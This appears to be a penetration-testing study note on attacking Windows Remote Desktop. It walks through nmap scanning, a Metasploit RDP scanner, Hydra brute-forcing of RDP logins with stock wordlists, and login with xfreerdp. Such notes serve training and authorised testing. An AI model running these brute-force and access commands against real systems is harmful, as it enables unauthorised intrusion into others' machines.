# Exploiting RDP
> Remote Desktop Protocol (RPD) is a proprietary GUI remote access protocl developed by Microsoft and it is used to remotely connect to and interact with a Windows system.

RDP Default Port: `3389`
- But it can be configured to run on any other TCP port. Therefore be thorough in your port scanning and enumeration.
- Port 3389 is IANA registered for...
  - Microsoft WBT Server, used for Windows Remote Desktop and Remote Assistance connections (RDP - Remote Desktop Protocol).
  - Also used by Windows Terminal Server (`ms-wbt-server`).

## Contents
- [Intro](#)
- [Exploit Steps](#)
  - [Scan](#)
  - [2. MetaSploit RDP Scanner](#)
  - [3. Brute Force with Hydra](#)
  - [4. RDP Client Access](#)
    - [xfreerdp](#)
    - [Remmina](#)

## Intro
> RDP authentication requires a legitimate user account on the target system as well as the user's password in clear-text.

- We can perform an RDP brute-force attack to identify legitimate user credentials that we can use to gain remote access to the target system. 
- And, of course, we'd like to grab the `administrator` creds if possible.

## Exploit Steps

### 1. Scan
```
nmap -sS -sV -sC -O -T4 -p- [target ip]
```
- If port `3389` is not listed in the results, look around for `ms-wbt-server` and note what port it's running on (that's RDP).
- How could you verify if RDP is running on port 3333?
  - One way is to connect to the target system using an RDP client on port 3333. You can connect, but you'll not have access without user creds.
  - You could also use the MetaSploit RDP scanner...

### 2. MetaSploit RDP Scanner
```
msfconsole
> search rdp_scanner
> use [that module]
> check and set options (target ip and port)
> run (and it should verify if RDP is running on the target port or not)
```

### 3. Brute Force with [Hydra](../../hydra.md)
```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt [target ip] rdp -s 3333
# or
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://[target ip] -s 3333
# or
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://[target ip]:3333
```
- `-s` : service port (if not default)
- Be very careful with your brute-force speed. You could crash the system or DoS it.
  - The `-t` (tasks) options sets the number of connects in parallel (default is 16, for reference)
  - You could set `-t 2` or `-t 3` and see if that plays nicer.  Hydra actually recommends `-t 1` through `-t 4`.
- Once you run hydra you should get some creds to test drive. To do that use...

### 4. RDP Client Access

#### xfreerdp
```
xfreerdp /u:[username] /p:[password] /v:[targetip]:3389
```

#### [Remmina](https://remmina.org/)
- Another RDP client for Linux you could use. 
